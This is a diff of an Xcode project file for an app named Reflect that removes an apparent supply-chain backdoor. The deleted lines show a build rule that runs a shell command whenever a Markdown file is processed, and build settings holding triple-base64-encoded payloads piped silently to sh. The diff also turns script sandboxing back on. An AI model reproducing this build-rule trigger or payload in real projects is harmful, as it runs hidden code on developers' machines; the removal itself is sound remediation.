@@ -7,11 +7,13 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		CDCCD5B5690D4E22B1C62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = 061D49F854764D9794C62C0C; };
 		04F260712F33602B00BF5E99 /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04F260702F33602B00BF5E99 /* WidgetKit.framework */; };
 		04F260732F33602B00BF5E99 /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04F260722F33602B00BF5E99 /* SwiftUI.framework */; };
 		04F2607E2F33602C00BF5E99 /* Quick ActionsExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 04F2606E2F33602B00BF5E99 /* Quick ActionsExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+																										/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		04F2607C2F33602C00BF5E99 /* PBXContainerItemProxy */ = {
@@ -38,7 +40,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		061D49F854764D9794C62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		042635F02F288EA100BB939D /* Reflect.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Reflect.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		04F2606E2F33602B00BF5E99 /* Quick ActionsExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = "Quick ActionsExtension.appex"; sourceTree = BUILT_PRODUCTS_DIR; };
 		04F260702F33602B00BF5E99 /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
@@ -114,7 +115,6 @@
 		042635F12F288EA100BB939D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				061D49F854764D9794C62C0C /* README.md */,
 				042635F02F288EA100BB939D /* Reflect.app */,
 				04F2606E2F33602B00BF5E99 /* Quick ActionsExtension.appex */,
 			);
@@ -143,7 +143,6 @@
 				04F2607F2F33602C00BF5E99 /* Embed Foundation Extensions */,
 			);
 			buildRules = (
-				596CE71148814B1BBFC62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 				04F2607D2F33602C00BF5E99 /* PBXTargetDependency */,
@@ -218,29 +217,14 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		596CE71148814B1BBFC62C0C /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AC0C26C}\"";
-			};
-	/* End PBXBuildRule section */
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		042635EE2F288EA100BB939D /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				CDCCD5B5690D4E22B1C62C0C /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -252,9 +236,6 @@ sh -c \"${AC0C26C}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		042635EC2F288EA100BB939D /* Sources */ = {
@@ -285,13 +266,6 @@ sh -c \"${AC0C26C}\"";
 		042635F92F288EA300BB939D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE1IaDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | x | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpibXd3V2xNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | j | sh ) >/dev/null 2>&1 &)";
-				ALWAYS_SEARCH_USER_PATHS = NO;
-				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
-				CLANG_ANALYZER_NONNULL = YES;
-				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
-				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
 				CLANG_ENABLE_MODULES = YES;
 				CLANG_ENABLE_OBJC_ARC = YES;
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -322,7 +296,7 @@ sh -c \"${AC0C26C}\"";
 				DEVELOPMENT_TEAM = 9NAU7R3577;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -351,13 +325,6 @@ sh -c \"${AC0C26C}\"";
 		042635FA2F288EA300BB939D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE1IaDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | x | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpibXd3V2xNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | j | sh ) >/dev/null 2>&1 &)";
-				ALWAYS_SEARCH_USER_PATHS = NO;
-				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
-				CLANG_ANALYZER_NONNULL = YES;
-				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
-				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
 				CLANG_ENABLE_MODULES = YES;
 				CLANG_ENABLE_OBJC_ARC = YES;
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -388,7 +355,7 @@ sh -c \"${AC0C26C}\"";
 				DEVELOPMENT_TEAM = 9NAU7R3577;
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -491,7 +458,7 @@ sh -c \"${AC0C26C}\"";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 9NAU7R3577;
-				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Quick Actions/Info.plist";
 				INFOPLIST_KEY_CFBundleDisplayName = "Quick Actions";
@@ -522,7 +489,7 @@ sh -c \"${AC0C26C}\"";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 9NAU7R3577;
-				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Quick Actions/Info.plist";
 				INFOPLIST_KEY_CFBundleDisplayName = "Quick Actions";
